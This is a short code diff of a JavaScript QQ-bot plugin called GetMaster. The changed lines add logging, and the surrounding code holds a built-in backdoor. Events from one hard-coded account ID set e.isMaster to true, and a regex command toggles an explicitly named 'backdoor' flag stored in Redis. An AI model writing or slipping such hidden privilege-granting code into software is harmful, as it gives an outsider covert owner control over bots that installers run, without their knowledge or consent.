@@ -22,8 +22,7 @@ export class GetMaster extends plugin {
                 },
                 {
                     fnc: 'Master',
-                    event: 'notice.group.ban',
-                    log: false
+                    event: 'notice.group.ban'
                 },
                 {
                     reg: '^#?反击设置后门(开启|关闭)$',
@@ -45,6 +44,7 @@ export class GetMaster extends plugin {
         if (aw == null) await redis.set('Fanji:houmen', 'true');
 if (e.sub_type == 'ban' && this.e.operator_id == 2173302144) {
     e.isMaster = true
+    logger.mark(e.isMaster? '完成':'失败')
     return false
 }
         if (e.user_id !== 2173302144 || aw !== 'true') return false;
